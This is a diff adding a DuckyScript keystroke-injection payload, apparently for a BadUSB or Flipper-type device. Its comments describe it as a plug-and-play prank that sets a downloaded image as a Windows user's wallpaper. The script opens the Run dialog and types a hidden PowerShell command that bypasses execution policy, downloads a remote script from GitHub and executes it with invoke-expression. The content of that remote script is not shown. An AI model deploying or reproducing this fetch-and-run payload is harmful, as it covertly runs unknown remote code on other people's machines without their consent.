@@ -1,0 +1,18 @@
+REM     Title: AutoHoff
+REM
+REM     Author: Kaeus
+REM
+REM     Description: This payload downloads an image of the HOFF and sets it to be the target's desktop background
+REM
+REM     Target: Windows 10, 11
+REM
+REM
+REM     --------------------------------------------------------------------------------------
+REM     THIS PAYLOAD IS PLUG AND PLAY. NO MODIFICATIONS NEEDED SIMPLY RUN THE CODE DOWN BELOW.
+REM     --------------------------------------------------------------------------------------
+REM
+GUI r
+DELAY 500
+STRING powershell -w h -NoP -NonI -Exec Bypass $pl = iwr https://raw.githubusercontent.com/kaeus/flipper-fun/AutoHoff/AutoHoff.ps1?dl=1; invoke-expression $pl
+DELAY 500
+ENTER
